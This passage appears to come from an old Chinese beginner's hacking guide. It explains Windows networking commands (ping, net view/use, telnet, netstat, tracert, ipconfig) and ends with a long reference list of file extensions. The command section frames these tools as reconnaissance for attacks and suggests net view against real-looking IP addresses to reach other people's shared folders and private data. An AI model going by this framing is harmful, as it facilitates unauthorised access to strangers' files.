（1）选用/I参数时，不检测硬件；

（2）选用/B参数时，以黑白方式启动MSD；

（3）选用/S参数时，显示出简明的系统报告。



【常用命令】
"第一节、常用系统命令"

第一节、常用系统命令
一、ping命令
在Windows的控制窗口中（Windows 95/98/ME的command解释器、Windows NT/2000的cmd解释器），运行ping可以看到这个命令的说明，它是一个探测本地电脑和远程电脑之间信息传送速度的命令，这个命令需要TCP/IP协议的支持，ping将会计算一条信息从本地发送到远程再返回所需要的时间，黑客使用这个命令决定是否对服务器进行攻击，因为连接速度过慢会浪费时间、花费过多的上网费用。
另外这个命令还可以透过域名找到对方服务器的IP地址，我们知道域名只是提供给浏览网页用的，当我们看到一个不错的域名地址后，要想通过telnet连接它，就必须知道对方的IP地址，这里也要使用ping命令的。
这个命令的基本使用格式可以通过直接运行ping获得，现在假设目标是http://www.abc.com/，则可以在控制台下输入ping http://www.abc.com，经过等待会得到如下信息：

Pinging http://www.abc.com [204.202.136.32] with 32 bytes of data:
Reply from 204.202.136.32: bytes=32 time=302ms TTL=240
Reply from 204.202.136.32: bytes=32 time=357ms TTL=240
Reply from 204.202.136.32: bytes=32 time=288ms TTL=240
Reply from 204.202.136.32: bytes=32 time=274ms TTL=240

Ping statistics for 204.202.136.32:
Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
Minimum = 274ms, Maximum = 357ms, Average = 305ms

这些信息的意思是：www.abc.com的IP地址是204.202.136.32，对他发送了四次数据包，数据包的大小是32字节，每一次返回的时间分别是302ms、357ms、288ms、274ms。综合看，发送了四个数据包全部返回，最小时间是274ms，最大时间357ms，他们的平均时间是305ms。
这样黑客就了解了连接对方服务器使用的时间。另外这个命令还有一些特殊的用法，例如可以通过IP地址反查服务器的NetBIOS名，现在以211.100.8.87为例，使用ping配合“-a”，在控制台下输入命令ping -a 211.100.8.87，它的返回结果是：

Pinging POPNET-FBZ9JDFV [211.100.8.87] with 32 bytes of data:
Reply from 211.100.8.87: bytes=32 time=96ms TTL=120
Reply from 211.100.8.87: bytes=32 time=110ms TTL=120
Reply from 211.100.8.87: bytes=32 time=110ms TTL=120
Reply from 211.100.8.87: bytes=32 time=109ms TTL=120

Ping statistics for 211.100.8.87:
Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
Minimum = 96ms, Maximum = 110ms, Average = 106ms

从这个结果会知道服务器的NetBIOS名称是POPNET-FBZ9JDFV。另外在一般情况下还可以通过ping对方让对方返回给你的TTL值大小，粗略的判断目标主机的系统类型是Windows系列还是UNIX/Linux系列，一般情况下Windows系列的系统返回的TTL值在100-130之间，而UNIX/Linux系列的系统返回的TTL值在240-255之间，例如上面的www.abc.com返回的TTL是240，对方的系统很可能是Linux，而第二个目标的TTL是120，那么说明它使用的系统也许是Windows。
另外ping还有很多灵活的应用，我不在这里过多的介绍，读者请另行查阅此命令相关帮助文件。
二、net命令：
NET命令是很多网络命令的集合，在Windows ME/NT/2000内，很多网络功能都是以net命令为开始的，通过net help可以看到这些命令的详细介绍：
NET CONFIG 显示系统网络设置
NET DIAG 运行MS的DIAGNOSTICS程序显示网络的DIAGNOSTIC信息
NET HELP 显示帮助信息
NET INIT 不通过绑定来加载协议或网卡驱动
NET LOGOFF 断开连接的共享资源
NET LOGON 在WORKGROUP中登陆
NET PASSWORD 改变系统登陆密码
NET PRINT 显示或控制打印作业及打印队列
NET START 启动服务，或显示已启动服务的列表
NET STOP 停止网络服务
NET TIME 使计算机的时钟与另一台计算机或域的时间同步
NET USE 连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息 
NET VER 显示局域网内正在使用的网络连接类型和信息
NET VIEW 显示域列表、计算机列表或指定计算机的共享资源列表
这些命令在Win95/98中支持的比较少，只有几个基本常见的，而在NT或者2000中又元元多于上面的介绍，不过大多数对于初学者也没有必要掌握，所以我选择了WindowsME进行介绍，其中最常用到的是NET VIEW和NET USE，通过者两个命令，学习者可以连接网络上开放了远程共享的系统，并且获得资料。这种远程共享本来是为便捷操作设计的，但是很多网络管理员忽视了它的安全性，所以造成了很多不应该共享的信息的暴露，对于学习者来说，则可以轻易获得它人电脑上的隐私资料。
例如在控制台下输入net view \\202.96.50.24则可以获得对应IP的系统共享目录，进而找到他们的共享文件，当然这需要202.96.50.24系统的确存在共享目录，具体如何找到这些存在共享的系统，我将会在后面的文章中进行介绍。
三、telnet和ftp命令：
这两个命令分别可以远程对系统进行telnet登陆和ftp登陆，两种登陆使用的不同的协议，分别属于两种不同的网络服务，ftp是远程文件共享服务，也就是说学习者可以将自己的资料上传、下载，但是它并没有过多的权利，无法在远程电脑上执行上传的文件；而telnet则属于远程登陆服务，也就是说可以登陆到远程系统上，并获得一个解释器权限，拥有解释器就意味着拥有了一定的权限，这种权限可能是基本的文件操作、也可能是可以控制系统的管理员权限。
四、netstat命令：
这个程序有助于我们了解网络的整体使用情况。它可以显示当前正在活动的网络连接的详细信息，如采用的协议类型、当前主机与远端相连主机（一个或多个）的IP地址以及它们之间的连接状态等。 使用netstat ？可以显示它的命令格式和参数说明：
netstat [-a] [-e] [-n] [-s] [-p proto] [-r] [interval] 其中的参数说明如下：
-a 显示所有主机的端口号；
-e 显示以太网统计信息；
-n 以数字表格形式显示地址和端口；
-p proto 显示特定的协议的具体使用信息；
-r 显示本机路由表的内容；
-s 显示每个协议的使用状态（包括TCP、UDP、IP）；
interval 重新显示所选的状态，每次显示之间的间隔数（单位秒）。
netstat命令的主要用途是检测本地系统开放的端口，这样做可以了解自己的系统开放了什么服务、还可以初步推断系统是否存在木马，因为常见的网络服务开放的默认端口轻易不会被木马占用，例如：用于FTP（文件传输协议）的端口是21；用于TELNET（远程登录协议）的端口是23；用于SMTP（邮件传输协议）的端口是25；用于DNS（域名服务，即域名与IP之间的转换）的端口是53；用于HTTP（超文本传输协议）的端口是80；用于POP3（电子邮件的一种接收协议）的端口是110；WINDOWS中开放的端口是139，除此以外，如果系统中还有其他陌生的到口，就可能是木马程序使用的了。通过netstat或者netstat -a可以观察开放的端口，如果发现下面的端口，就说明已经有木马程序在系统中存在：
31337号端口是BackOffice木马的默认端口；1999是Yai木马程序；2140或者3150都是DEEP THROAT木马使用的端口；还有NETBUS、冰河或者SUB7等木马程序都可以自定义端口，因此发现了陌生端口一定要提高警惕，使用防火墙或者查病毒软件进行检测。
五、tracert命令：
这个命令的功能是判定数据包到达目的主机所经过的路径、显示数据包经过的中继节点清单和到达时间。tracert命令的格式如下：
tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name
命令行中的参数-d是要求tracert不对主机名进行解析，-h是指定搜索到目的地址的最大轮数，-j的功能是沿着主机列表释放源路由，-w用来设置超时时间间隔。
通过tracert可以判断一个服务器是属于国内还是国际（网络服务器的物理未知不能依靠域名进行判断），根据路由路经可以判断信息从自己的系统发送到网络上，先后经过了哪些IP到大对方服务器，这就好像乘公共汽车的时候从起点出发到达终点站的时候，中途会出现很多路牌一个道理，我们清楚了自己的信息的传送路径，才能够更清晰的了解网络、对服务器进行攻击。
六、winipcfg：
winipcfg和ipconfig都是用来显示主机内IP协议的配置信息。只是winipcfg适用于Windows 95/98，而ipconfig适用于Windows NT。winipcfg不使用参数，直接运行它，它就会采用Windows窗口的形式显示具体信息。这些信息包括：网络适配器的物理地址、主机的IP地址、子网掩码以及默认网关等，点击其中的“其他信息”，还可以查看主机的相关信息如：主机名、DNS服务器、节点类型等。其中网络适配器的物理地址在检测网络错误时非常有用。
ipconfig的命令格式如下：ipconfig [/? | /all | /release [adapter] | /renew [adapter]
其中的参数说明如下：
使用不带参数的ipconfig命令可以得到以下信息：IP地址、子网掩码、默认网关。而使用ipconfig
/? 显示ipconfig的格式和参数的英文说明；
/all 显示所有的配置信息；
/release 为指定的适配器（或全部适配器）释放IP地址（只适用于DHCP）；
/renew 为指定的适配器（或全部适配器）更新IP地址（只适用于DHCP）。
/all，则可以得到更多的信息：主机名、DNS服务器、节点类型、网络适配器的物理地址、主机的IP地址、子网掩码以及默认网关等。




【常见文件扩展名及简要说明】
                   常见文件扩展名及简要说明

A 对象代码库文件 
AAM Authorware shocked文件 
AAS Authorware shocked包 
ABF Adobe二进制屏幕字体 
ABK CorelDRAW自动备份文件 
ABS 该类文件有时用于指示一个摘要（就像在一篇有关科学方面的文章的一个摘要或概要，取自abstract） 
ACE Ace压缩档案格式 
ACL CorelDRAW 6键盘快捷键文件 
ACM Windows系统目录文件 
ACP Microsoft office助手预览文件 
ACR 美国放射医学大学文件格式 
ACT Microsoft office助手文件 
ACV OS/2的驱动程序，用于压缩或解压缩音频数据 
AD After Dark屏幕保护程序 
ADA Ada源文件（非-GNAT） 
ADB Ada源文件主体（GNAT）；HP100LX组织者的约定数据库 
ADD OS/2用于引导过程的适配器驱动程序 
ADF Amiga磁盘文件 
ADI AutoCAD设备无关二进制绘图仪格式 
ADM After Dark多模块屏幕保护；Windows NT策略模板 
ADP FaxWork用于传真调制解调器的交互安装文件；Astound Dynamite文件 
ADR After Dark随机屏幕保护；Smart Address的地址簿 
ADS Ada源文件说明书（GNAT） 
AFM Adobe的字体尺度 
AF2，AF3 ABC的FlowChat文件 
AI Adobe Illustrator格式图形 
AIF，AIFF 音频互交换文件，Silicon Graphic and Macintosh应用程序的声音格式 
AIFC 压缩AIF 
AIM AOL即时信息传送 
AIS ACDSee图形序列文件；Velvet Studio设备文件 
AKW RoboHELP的帮助工程中所有A-关键词 
ALAW 欧洲电话音频格式 
ALB JASC Image Commander相册 
ALL 艺术与书信库 
AMS Velvet Studio音乐模块（MOD）文件；Extreme的Tracker模块文件 
ANC Canon Computer的调色板文件，包含一系列可选的颜色板 
ANI Windows系统中的动画光标 
ANS ANSI文本文件 
ANT SimAnt For Windows中保存的游戏文件 
API Adobe Acrobat使用的应用程序设计接口文件 
APR Lotus Approach 97文件 
APS Microsoft Visual C++文件 
ARC LH ARC的压缩档案文件 
ARI Aristotle声音文件 
ARJ Robert Jung ARJ压缩包文件 
ART Xara Studio绘画文件；Canon Crayola美术文件；Clip Art文件格式；另一种光线跟踪格式；AOL使用的用Johnson―Grace压缩算法压缩的标记文件 
ASA Microsoft Visual InterDev文件 
ASC ASCⅡ文本文件；PGP算法加密文件 
ASD Microsoft Word的自动保存文件；Microsoft高级流媒体格式（microsoft advanced streaming FORMat，ASF）的描述文件；可用NSREX打开 Velvet Studio例子文件 
ASE Velvet Studio采样文件 
ASF Microsoft高级流媒体格式文件 
ASM 汇编语言源文件，Pro/E装配文件 
ASO Astound Dynamite对象文件 
ASP 动态网页文件；ProComm Plus安装与连接脚本文件；Astound介绍文件 
AST Astound多媒体文件；ClarisWorks“助手”文件 
ASV DataCAD自动保存文件 
ASX Cheyenne备份脚本文件；Microsoft高级流媒体重定向器文件，视频文件 
ATT AT< Group 4位图文件 
ATW 来自个人软件的Any Time Deluxe For Windows个人信息管理员文件 
AU Sun/NeXT/DEC/UNIX声音文件；音频U-Law（读作“mu-law”）文件格式 
AVB Computer Associates Inoculan反病毒软件的病毒感染后文件 
AVI Microsoft Audio Video Interleave电影格式 
AVR Audio Visual Research文件格式 
AVS 应用程序可视化格式 
AWD FaxVien文档 
AWR Telsis数字储存音频文件扩展名格式 
Axx ARJ压缩文件的分包序号文件，用于将一个大文件压至几个小的压缩包中（xx取01-99的数字） 
A3L Authorware 3.x库文件 
A4L Authorware 4.x库文件 
A5L Authorware 5.x库文件 
A3M，A4M Authorware Macintosh未打包文件 
A4P Authorware无运行时间的打包文件 
A3W，A4W，A5W 未打包的Authorware Windows文件 
BAK 备份文件 
BAS BASIC源文件 
BAT 批处理文件 
BDF West Point Bridger Designer文件 
BFC Windows 95 Briefcase文档 
BG Backgammon For Windows下的游戏文件 
BGL Microsoft Flight Simulator（微软飞行模拟器）的视景文件 
BI 二进制文件 
BIF Group Wise的初始化文件 
BIFF XLIFE 3D格式文件 
BIN 二进制文件 
BK，BK$ 有时用于代表备份版本 
BKS IBM BookManager Read书架文件 
BMK 书签文件 
BMP Windows或OS/2位图文件 
BMI Apogee BioMenace数据文件 
BOOK Adobe FrameMaker Book文件 
BOX Lotus Notes的邮箱文件 
BPL Borlard Delph 4打包库 
BQY BrioQuery文件 
BRX 用于查看多媒体对象目录的文件 
BSC MS Developer Studio浏览器信息文件 
BSP Quake图形文件 
BS1 Apogee Blake Stone数据文件 
BS_ Microsoft Bookshelf Find菜单外壳扩展名 
BTM Norton 应用程序使用的批处理文件 
BUD Quicken的备份磁盘 
BUN CakeWalk 声音捆绑文件(一种MIDI程序) 
BW SGI黑白图像文件 
BWV 商业波形文件 
BYU BYU的电影文件格式 
B4 Helix Nuts and Bolts文件 
C C代码文件 
C0l 台风波形文件 
CAB Microsoft压缩档案文件 
CAD Softdek的Drafix CAD文件 
CAL CALS压缩位图；日历计划表数据 
CAM Casio照相机格式 
CAP 压缩音乐文件格式 
CAS 逗号分开的ASCⅡ文件 
CAT Quicken使用 的IntellCharge分类文件 
CB Microsoft干净引导文件 
CBI 二进制卷格式文件(用于IBM大型机系统) 
CC Visual dBASE用户自定义类文件 
CCA cc：邮件文件 
CCB Visual Basic动态按钮配置文件 
CCF 多媒体查看器配置文件，用于OS/2 
CCH Corel图表文件 
CCM Lotus cc：邮箱（例如“INBOX.CCM”） 
CCO CyberChat数据文件 
CCT Macromedia Director Shockwave投影 
CDA CD音频轨道 
CDF Microsoft频道定义格式文件 
CDI Philip的高密盘交互格式 
CDM Visual dBASE自定义数据模块文件 
CDR CorelDRAW绘图文件；原始音频CD数据文件 
CDT CorelDRAW模板 
CDX CorelDRAW压缩绘图文件；Microsoft Visual FoxPro索引文件 
CEL CIMFast事件语言文件 
CER 证书文件（MIME x-x509-ca-cert） 
CFB Compton的多媒文件 
CFG 配置文件 
CFM CotdFusion模板文件；Visual dBASE Windows用户定制表单 
CGI 公共网关接口脚本文件 
CGM 计算机图形元文件 
CH OS/2配置文件 
CHK 由Windows磁盘碎片整理器或磁盘扫描保存的文件碎片 
CHM 编译过的HTML文件 
CHR 字符集（字体文件） 
CHP Ventura Publisher章节文件 
CHT ChartViem文件；Harvard Graphics矢量文件 
CIF Adaptec CD 创建器 CD映像文件 
CIL Clip Gallery下载包 
CIM SimCity 2000文件 
CIN OS/2改变控制文件用于跟踪INI文件中的变化 
CK1 iD/Apogee Commander Keen 1数据文件 
CK2 iD/Apogee Commander Keen 2数据文件 
CK3 iD/Apogee Commander Keen 3数据文件 
CK4 iD /Apogee Commander Keen 4数据文件 
CK5 iD /Apogee Commander Keen 5数据文件 
CK6 iD /Apogee Commander Keen 6数据文件 
CLASS Java类文件 
CLL Crick Software Clicker文件 
CLP Windows 剪贴板文件 
CLS Visual Basic类文件 
CMD Windows NT，OS/2的命令文件；DOS CD/M命令文件；dBASEⅡ程序文件 
CMF Corel元文件 
CMG Chessmaster保存的游戏文件 
CMP JPEG位图文件；地址文档 
CMV Corel Move动画文件 
CMX Corel Presentation Exchange图像 
CNF Telnet，Windows和其他其内格式会发生改变的应用程序使用的配置文件 
CNM Windows应用程序菜单选项和安装文件 
CNQ Compuworks Design Shop文件 
CNT Windows（或其他）系统用于帮助索引或其他目的内容文件 
COB TrueSpace 2对象文件 
COD Microsoft C编译器产生的可显示机器码/汇编代码文件，其中附有源C代码作为注释 
COM 命令文件（程序） 
CPD Corel Print Office文件（图形） 
CPD，CPE 传真覆盖文档 
CPI Microsoft MS-DOS代码页信息文件 
CPL 控制面板扩展名，Corel颜色板 
CPO Corel打印存储文件 
CPP C++代码文件 
CPR Corel提供说明书文件 
CPT Corel 照片-绘画图像 
CPX Corel Presentation Exchange压缩图形文件 
CRD Windows Cardfile文件 
CRP Corel 提供的运行时介绍文件；Visual dBASE自定义报表文件 
CRT 认证文件 
CSC Corel脚本文件 
CSP PC Emcee On_Screen图像 
CSS 瀑布式表格文件 
CST Macromedia Director Cast文件 
CSV 逗号分隔的值文件 
CT Scitex CT位图文件；Paint Shop Pro Grapic编辑器文件 
CTL 通常用于表示一个包含控件信息的文件；FaxWork用它来保持有关每个传真收到或发出的信息 
CUE Microsoft提示牌数据文件 
CUR Windows光标文件 
CUT Dr Halo位图文件 
CV Corel版本的档案文件；Microsoft CodeView信息屏幕文件 
CWK ClarisWorks数据文件. 
CWS ClarisWorks模块 
CXT Macromedia Director受保护的（不可编辑的）投影文件 
CXX C++源代码文件 
DAT 数据文件；WrodPerfect合并数据文件；用于一些MPEG格式的文件 
DB Borland的Paradox 7表 
DBC Microsoft Visual FoxPro数据库容器文件 
DBF dBASE文件，一种由Ashton-Tate创建的格式，可以被ACT！、Lipper、FoxPro、Arago、Wordtech、Xbase和类似数据库或与数据库有关产品识别；可用数据文件（能被Excel 97打开）；Oracle 8.1.x表格空间文件 
DBX DataBearn图像；Microsoft Visual FoxPro表格文件 
DCM DCM模块格式文件 
DCR 冲击波文件 
DCS 桌面颜色分隔文件 
DCT Microsoft Visual FoxPro数据库容器 
DCU Delphi编译单元文件 
DCX Microsoft Visual FoxPro数据库容器；基于PCX的传真图像；宏 
DC5 DataCAD绘图文件 
DDF Btrieve或Xtrieve数据定义文件，它包含用于描述Btrieve或Xtrieve文件的元数据 
DDIF Digital Equipment或 Compaq格式，用于保存他们图像与字处理文档 
DEF SmartWareⅡ数据文件；C++模块定义文件 
DEFI Oracle 7 卸载脚本文件 
DEM 用于表示数字高度模型的USGS基准的文件 
DER 认证文件 
DEWF Macintosh Sound Cap/Sound Edit录音设备格式 
DGN Macintosh 95 CAD绘图文件 
DIB 设备无关位图 
DIC 目录 
DIF 可进行数据互换的电子表格 
DIG DigiLink格式；Sound DesignerⅠ音频文件 
DIR MacromediaDirector文件 
DIZ 描述文件 
DLG C++对话框脚本文件 
DLL 动态链接库 
DLS 可下载声音文件 
DMD Visual dBASE数据模块文件 
DMF X-Trakker音乐模块（MOD）文件 
DOC FrameMaker或FrameBuilder文档；Word Star文档、Word Perfect文档、Microsoft Word文档；DisplayWrite文档 
DOT Microsoft Word文档模板 
DPL Borland Delph3压缩库 
DPR Borland Delphi工程头文件 
DRAW Acorn的基于对象的矢量图像文件 
DRV 驱动程序 
DRW Micrografx Designer/Draw；Pro/E绘画文件 
DSF Micrografx Designer VFX文件 
DSG DOOM保存的文件 
DSM Dynamic Studio音乐模块（MOD）文件 
DSP Microsoft Developer Studio工程文件 
DSQ Corel QUERY（查询）文件 
DST 刺绣机图形文件 
DSW Microsoft Developer Studio工作区文件 
DTA Word Bank（世界银行）的STARS数据文件 
DTD SGML文档类型定义（DTD）文件 
DTED 地面高度数字数据（图形的数据格式）文件 
DTF Symantec Q&A相关的数据库数据文件 
DTM DigiTrakker模块文件 
DUN Microsoft拔号网络导出文件 
DV 数字视频文件（MIME） 
DWD DiamondWare数字化文件 
DWG AutoCAD工程图文件；AutoCAD或Generic CADD老版本的绘图格式 
DXF 可进行互交换的绘图文件格式，二进制的DWG格式的文本表示；数据交换文件 
DXR Macromedia Director受保护（不可编辑）电影文件 
D64 Commodore的64位模拟磁盘图像文件 
EDA Ensoniq ASR磁盘映像 
EDD 元素定义文档（FrameMaker+SGML文档） 
EDE Ensoniq EPS磁盘映像 
EDK Ensoniq KT磁盘映像 
EDQ Ensoniq SQ1/SQ2/Ks32磁盘映像 
EDS Ensoniq SQ80磁盘映像 
EDV Ensoniq VFX-SD磁盘映像 
EFA Ensoniq ASR文件 
EFE Ensoniq EPS文件 
EFK Ensoniq KT文件 
EFQ Ensoniq SQ1/SQ2/Ks32文件 
EFS Ensoniq SQ80文件 
EFV Ensoniq VFX-SD文件 
EMD ABT扩展模块 
EMF Windows增强元文件 
EML Microsoft Outlook Express邮件消息（MIME RTC822）文件 
ENC 重演文件 
ENFF 中性文件格式扩展名 
EPHTML Perl解释增强HTML文件 
EPS 压缩的PostScript图像 
EPSF 压缩的PostScript文件 
ERI ERWin文件 
ERR 当RobooHELP帮助编译器企图编译一个帮助系统源文件时用来存储错误消息的文件 
EPX ERWin文件 
ESPS ESPS音频文件 
EUI Ensoniq ESP家族的压缩磁盘映像 
EVY 特使文档 
EWL Microsoft Encarta文档 
EXC Microsoft Word禁止字字典 
EXE 可执行文件（程序） 
F FORTRAN文件 
F2R Farandoyle线性模块格式 
F3R Farandoyle分块线性模块格式 
F77 FORTRAN文件 
F90 FORTRAN文件 
FAR Fradole Composer音乐模块（MOD）文件 
FAV Microsoft Outlook导航条 
FAX 传真类型图像 
FBK Navison 金融备份 
FCD 虚拟CD-ROM 
FDB Navison 金融数据库 
FDF Adobe Acrobat表单文档文件 
FEM CADRE有限元素网络文件 
FFA，FFL，FFO，FFK Microsoft快速查找文件 
FFF GUS PnP银行文件格式 
FFT 最终格式文本（IBM的DCA一部分） 
FH3 Aldus Freehand 3绘图文件 
FIF Fractal图像文件 
FIG REND386/AVRIL使用的文件格式 
FITS CCD照相机图像；灵活图像传输系统 
FLA Macromedia Flash电影 
FLC Autodesk FLIC动画文件 
FLF Corel Paradox产生的格式：Navison Financials许可文件；OS/2驱动程序文件 
PLI Autodesk FLIC动画 
FLT StarTrekker音乐模块(MOD)文件；MultiGen Inc的Open Flight使用的文件格式；Corel过滤器文件 
FM Adobe FrameMaker文档 
FMB Oracle4.0版或以后版本表单的二进制源代码文件 
FML 文件镜象列表（GetRight） 
FMT Oracle 4.0版或以后版本表单的文本格式；Microsoft Schedule+ 打印文件 
FMX Oracle 4.0版或以后版本可执行表单 
FND Microsoft Explorer保存的搜索文件（Find applet） 
FNG 字体组文件（字体导航器，Font Navigator） 
FNK Funk Tracker模块格式 
FOG Fontographer模块字体 
FON 系统字体 
FOR FORTRAN文件 
FOT 字体相关文件 
FP FileMaker Pro文件 
FP1 Flying Pigs for Windows数据文件 
FP3 FileMaker Pro文件 
FPT FileMaker Pro文件；Microsoft Fox Pro备注字体文件 
FPX FlashPix位图 
FRM 表单；Frame Maker或Frame Builder文档；Oracle可执行表(3.0版或早期版本)；Visual Basic表单；WordPerfect Merge表单；DataCAD标志报表文件 
FRT Microsoft FoxPro报表文件 
FRX Visual Basic表单文本；Microsoft FoxPro报表文件 
FSF fPrint Audit Tool文件格式 
FSL Borland的Paradox 7表单；Corel Paradox保存的表单 
FSM Parandoyle示例格式 
FT Lotus Notes全文本索引 
FTG 全文本搜索组文件，由Windows帮助系统查找时产生――可以删除，并在需要时重建起来 
FTS 全文本搜索引文件，由Windows帮助系统查找时产生 
FW2 Framework Ⅱ文件 
FW3 Framework Ⅲ文件 
FW4 Framework Ⅳ文件 
FXP 经Microsoft FoxPro编译的源文件 
FZB Casio FZ-1银行转储 
FZF Casio FZ-1完全转储 
FZV Casio FZ-1声音转储 
G721 Raw CCITT G.721 $bit ADPCM格式数据 
G723 Raw CCITT G.723 3或5bit ADPCM格式数据 
GAL Corel多媒体管理器相集 
GCD Generic CADD绘画文件（后续版本） 
GCP Ground Control Point（地面控制点）文件，用于远景数据形成图像过程，经常用于生成图工程―CHIPS（copenhagen image processing system）使用这些文件 
GDB InterBase数据库文件 
GDM 铃声、口哨声和声音板模块格式 
GED GEDCOM 系谱数据文件，用于记录和交换系谱数据的流行格式；图形环境文档绘画 
GEM GEM元文件 
GEN Ventura产生的文本文件 
GetRight GetRight未完成的下载文件 
GFC Patton&Patton FlowCharting 4 flowchart文件 
GFI，GFX Genigraphics图形链接表示文件 
GHO Norton 克隆磁盘映像 
GID Windows 95全局索引文件（包括帮助状态） 
GIF CompuServe位图文件 
GIM，GIX Genigraphics图形链接介绍文件 
GKH Ensoniq EPS家簇磁盘映像文件 
GKS Gravis Grip Key文档 
GL 动画格式 
GNA Genigraphics图形链接介绍文件 
GNT 生成代码，Micro Focus属性格式里的可执行代码 
GNX Genigraphics图形链接介绍文件 
GRA Microsoft Graph文件 
GRD 用于远程视景数据产生地图过程的格式文件，通常应用于形成地图工程―CHIPS（copenhagen image processing system）使用这些文件 
GRF Grapher（Golden Software公司）图形文件 
GRP 程序管理组 
GSM Raw GSM 6.10音频流；Raw“byte aligned（比特对齐的）” GSM 6.10音频流；US Robotics语音调制解调器 
GTK Graoumftracker（老）音乐模块（MOD）文件 
GT2 Graoumftracker（新）音乐模块（MOD）文件 
GWX，GWZ Cenigraphis图形链接介绍文件 
GZ UNIX gzip压缩文件 
H C程序头文件 
HCM IBM HCM配置文件 
HCOM 声音工具HCOM格式 
HCR IBM HCD/HCM产品配置文件 
HDF 高级计算机应用程序本地中心（NCSA） geospatial Hierarchial数据格式文件 
HED HighEdit文档 
HEL Microsoft Hellbender格式保存的游戏文件 
HEX Macintosh BinHex2.0文件 
HGL HP图形语言绘图文件 
HH 映射文件，包括一些话题ID和在帮助文件系统中话题的映射数字―允许运行中应用程序发送给用户合适的上下文帮助话题 
HLP 帮助文件；Date CAD Windows帮助文件 
HOG Lucas Arts的Dark Forces WAD文件 
HPJ Visual Basic帮助工程 
HPP C++程序头文件 
HQX Macintosh BinHex 4.0文件 
HST 历史文件 
HT HyperTerminal（超级终端） 
HTM，HTML 超文本文档 
HTT Microsoft超文本模板 
HTX 扩展HTML模板 
HXM Descent2 HAM文件扩展 
ICA Citrix文件 
ICB Targa位图文件 
ICC Kodak打印机格式文件 
ICL 图标库文件 
ICM 图形颜色匹配配置文件 
ICO Windows图标 
IDB MSDev中间层文件 
IDD MIDI设备定义 
IDF MIDI设备定义（Windows 95需要的文件） 
IDQ Internet数据查询文件 
IDX Microsoft FoxPro相关数据库索引文件；Symantec Q&A相关数据库索引文件；Microsoft Outlook Express文件 
IFF 交换格式文件；Amiga ILBM 
IGES 初始图形交换说明文件 
IGF 插入系统元文件 
IIF QuickBooks for Windows交换文件 
ILBM 位图图形文件 
IMA WinImage磁盘映像文件 
IMG GEM映像 
IMZ WinImage压缩磁盘映像文件 
INC 汇编语言或动态服务器包含文件 
INF 信息文件 
INI 初始化文件；MWave DSP Synth的“nwsynth.ini” GMS安装；Cravis Ultrasound bank安装 
INP Oracle 3.0版或早期版本的表单源代码 
INRS INRS远程通信声频 
INS InstallShield安装脚本；X-Internet签字文件；Ensoniq EPS字簇设备；Cell/ⅡMAC/PC抽样设备 
INT 中间代码，当一个源程序经过语法检查后编译产生一个可执行代码 
IOF Findit文档 
IQY Microsoft Internet查询文件 
ISO 根据ISD 9660有关CD-ROM文件系统标准列出CD-ROM上的文件 
ISP X-Internet签字文件 
IST 数字跟踪设备文件 
ISU InstallShield卸装脚本 
IT 脉冲跟踪系统音乐模块(MOD)文件 
ITI 脉冲跟踪系统设备 
ITS 脉冲跟踪系统抽样，Internet文档位置 
IV Open Inventor中使用的文件格式 
IVD 超过20/20微观数据维数或变量等级文件 
IVP 超过20/20的用户子集配置文件 
IVT 超过20/20表或集合数据文件 
IVX 超过20/20微数据目录文件 
IW Idlewild屏幕保护程序 
IWC Install Watch文档 
J62 Ricoh照相机格式 
JAR Java档案文件（一种用于applet和相关文件的压缩文件） 
JAVA Java源文件 
JBF Paint Shop Pro图像浏览文件 
JFF，JFIF，JIF JPEG文件 
JMP SAS的JMPDiscovery表格统计文件 
JN1 Epic MegaGames的Jill of the Jungle数据文件 
JPE，JPEG，JPG JPEG图形文件 
JS javascript源文件 
JSP HTML网页，其中包含有对一个Java servlet的参考 
JTF JPEG位图文件 
K25 Kurzweil 2500抽样文件 
KAR 卡拉OK MIDI文件（文本+MIDI） 
KDC Kodak光增强器 
KEY DataCAD图标工具条文件 
KFX KoFak Group 4图像文件 
KIZ Kodak数字明信片文件 
KKW RoboHELP帮助工程索引设计器中与主题无关的K开头的所有关键字 
KMP Korg Trinity KeyMap文件 
KQP Konica照相机本地文件 
KR1 Kurzweil 2000抽样（多软驱）文件 
KRZ Kurzweil 2000抽样文件 
KSF Korg Trinity抽样文件 
KYE Kye游戏数据 
LAB Visual dBASE标签文件 
LBM Deluxe Paint位图文件 
LBT，LBX Microsoft FoxPro标签文件 
LDB Microsoft Access加锁文件 
LDL Corel Paradox分发库 
LEG Legacy文档 
LES Logitech娱乐系统游戏配置文件（与REC文件一样） 
LFT 3D Studio（DOS）放样文件 
LGO Paintbrush（Microsoft画图应用程序）的徽标文件 
LHA LZH更换文件后缀 
LIB 库文件 
LIN DataCAD线型文件 
LIS 结构化查询报告（SQR）程序产生的输出文件 
LLX Laplink交换代理 
LNK Windows快捷方式文件 
LOG 日志文件 
LPD Helix Nut和Bolt文件 
LRC Intel可视电话文件 
LSL Corel Paradox保存的库文件 
LSP AutoLISP、CommonLISP和其他LISP语言文件 
LST 列表文件 
LU ThoughtWing库单元文件 
LVL Parallax Software的 Miner Descent/D2 Level扩展 
LWLO Lightwave分层对象文件 
LWOB Lightwave对象文件 
LWP Lotus WordPro 96/97文件 
LWSC Lightwave视景文件 
LYR DataCAD层文件 
LZH LH ARC压缩档案 
LZS Skyroads数据文件 
M1V MPEG相关文件(MIME“mpeg”类型) 
M3D Corel Motion 3D动画文件 
M3U MPEG URL（MIME声音文件） 
MAC MacPaint图像文件 
MAD Microsoft Access模块文件 
MAF Microsoft Access表单文件 
MAG 在一些日本文件中发现的图形文件格式 
MAGIC 魔力邮件监视器配置文件 
MAK Visual Basil或Microsoft Visual C++工程文件 
MAM Microsoft Access宏 
MAN UNIX手册页输出 
MAP 映射文件；Duke Nukem 3D WAD游戏文件 
MAQ Microsoft Access查询文件 
MAR Microsoft Access报表文件 
MAS Lotus Freelance Graphics Smart Master文件 
MAT Microsoft Access表；3D Studio MAX材料库 
MAUD MAUD抽样格式 
MAX Kinetx的3DStudio MAX文件；该格式用于一个3D场景文件；Paperport文件；OrCAD设计文件 
MAZ Hover迷路数据；Division的dVS/dVISE使用的文件格式 
MB1 Apogee Monster Bash数据文件 
MBOX Berkeley Unix邮箱格式 
MBX Microsoft Outlook保存email格式；Eudora邮箱 
MCC Dailerl0呼叫卡 
